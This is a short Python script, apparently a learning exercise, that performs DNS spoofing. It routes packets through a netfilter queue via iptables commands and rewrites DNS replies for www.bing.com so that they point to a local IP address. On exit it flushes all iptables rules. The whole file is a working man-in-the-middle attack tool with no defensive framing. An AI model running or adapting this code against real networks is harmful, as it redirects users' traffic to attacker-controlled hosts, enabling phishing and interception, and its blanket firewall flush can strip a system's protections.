#!/root/anaconda3/bin  python

import netfilterqueue
import subprocess
import scapy.all as scapy

local_computer_test = True


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata='192.168.1.161')

            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


if __name__ == '__main__':

    if local_computer_test:
        subprocess.call(
            r'iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
        subprocess.call(
            r'iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    else:
        subprocess.call(
            r'iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)

    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        subprocess.call(r'iptables --flush', shell=True)
